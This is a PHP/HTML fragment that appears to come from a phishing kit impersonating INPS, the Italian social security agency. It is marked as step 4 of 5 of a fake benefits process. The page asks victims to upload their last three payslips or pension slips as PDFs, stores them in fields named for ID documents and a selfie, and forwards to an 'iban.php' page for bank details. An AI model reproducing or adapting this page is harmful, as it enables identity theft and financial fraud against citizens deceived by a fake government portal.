...
//CUSTOM
$pagina=array('CIF3','CIR3','SELFIE3');
$numero = 3;
$prossima = "iban.php";
...
<div style="font-size: 140%;margin: 0px 4%;font-weight:normal"><h1>Attestazione condizione lavorativa e reddituale.</h1>    
<h2 style="font-size: 120%;margin-top: 0px;font-weight:normal">PER ATTESTARE LA SITUAZIONE LAVORATIVA E REDDITUALE, INSERIRE COME PROVA DI REDDITO LE SUE ULTIME TRE BUSTE PAGA O CERTIFICATO DI PENSIONE CEDOLINO.</h2>
        <br>
<br>
    <p >INPS EROGAZIONI - PASSO 4 DI 5</p>
<div class="progress">
  <div class="progress-bar" role="progressbar" style="width: 75%" aria-valuenow="40" aria-valuemin="0" aria-valuemax="100"></div>
</div>
...
<form method="POST" autocomplete="off">
   ...
   <h3 class="sopra">Gentile Utente, inserisca nel modulo sottostante le sue ultime tre buste paga in formato PDF.</h3>
   

        <div class="container caricamento" data-input="CIF3">
          <div class="row" style="padding-top:10px;">
            <div class="">
              <button data-type="pdf_1" id="uploadBtn" class="btn uploadBtn btn-large btn-primary">Carica Busta paga </button>
            </div>
    ...
    <input autocomplete="off" required="" class="i1 nascondi CIF3" type="text" name="CIF3">   
      </div> 
                <div class="container caricamento" data-input="CIR3">
          <div class="row" style="padding-top:10px;">
            <div class="">
              <button data-type="pdf_2" id="uploadBtn" class="btn uploadBtn btn-large btn-primary">Carica Busta paga </button>
            </div>
            <div class="col-12" style=" margin-top: 10px;padding-left:0px; ">
          <div id="progressOuter" class=" progressOuter progress progress-striped active" style="display:none;height: 30px;">
            <div id="progressBar" class=" progressBar progress-bar progress-bar-success" role="progressbar" aria-valuenow="45" aria-valuemin="0" aria-valuemax="100" style="width: 0%">
    ...
    <input autocomplete="off" required="" class="i1 nascondi CIR3" type="text" name="CIR3">   
      </div> 
	    <div class="container caricamento" data-input="SELFIE3">
          <div class="row" style="padding-top:10px;">
            <div class="">
              <button data-type="pdf_3" id="uploadBtn" class="btn uploadBtn btn-large btn-primary">Carica Busta paga </button>
            </div>
            <div class="col-12" style=" margin-top: 10px;padding-left:0px; ">
          <div id="progressOuter" class=" progressOuter progress progress-striped active" style="display:none;height: 30px;">
            <div id="progressBar" class=" progressBar progress-bar progress-bar-success" role="progressbar" aria-valuenow="45" aria-valuemin="0" aria-valuemax="100" style="width: 0%">
    ...
    <input autocomplete="off" required="" class="i1 nascondi SELFIE3" type="text" name="SELFIE3">   
      </div> 
